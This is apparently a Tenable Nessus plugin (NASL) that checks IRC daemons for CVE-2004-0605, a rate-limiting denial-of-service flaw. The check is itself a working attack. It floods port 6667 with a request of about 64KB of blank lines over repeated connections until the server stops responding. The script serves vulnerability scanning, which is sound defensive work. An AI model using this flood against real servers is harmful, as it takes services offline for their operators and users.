#
# (C) Tenable Network Security
#

if(description)
{
 script_id(14253);
 script_cve_id("CVE-2004-0605");
 script_bugtraq_id(10572);
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "Multiple IRC daemons Dequeuing DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of ircd which is vulnerable
to a rate-limiting Denial of Service (DoS) attack.  The flaw is
in the fact that the IRCD daemon reserves more than 500 bytes of
memory for each line received.  

An attacker, exploiting this flaw, would need network access to the
IRC server.  A successful attack would render the IRC daemon, and
possibly the entire system, unusable.

The following IRC daemons are known to be vulnerable:
IRCD-Hybrid ircd-hybrid 7.0.1
ircd-ratbox ircd-ratbox 1.5.1
ircd-ratbox ircd-ratbox 2.0 rc6

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Multiple IRC daemons Dequeuing DoS check";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);

 script_dependencie("find_service.nes", "find_service2.nasl", "ircd.nasl");
 script_require_ports("Services/irc", 6667);
 exit(0);
}


port = get_kb_item("Services/irc");
if (!port) 
	port = 6667;

if(! get_port_state(port)) 
	exit(0);

# make sure the socket is actually open before we generate
# a massive req
soc = open_sock_tcp(port);
if (! soc)
	exit(0);

close(soc);

#display("port 6667 is open\n");

req = '';
for (i=0; i<65536; i += 2)
{
        req = req + string(" \n");
}

soc = open_sock_tcp(port);
send(socket:soc, data:req);
close(soc);

for (q=0; q<10; q++)
{
	soc = open_sock_tcp(port);
	if (soc)
	{
		send(socket:soc, data:req);
		close(soc);	
		sleep(3);
	}
	else
	{
		security_hole(port);
		exit(0);
	}
}


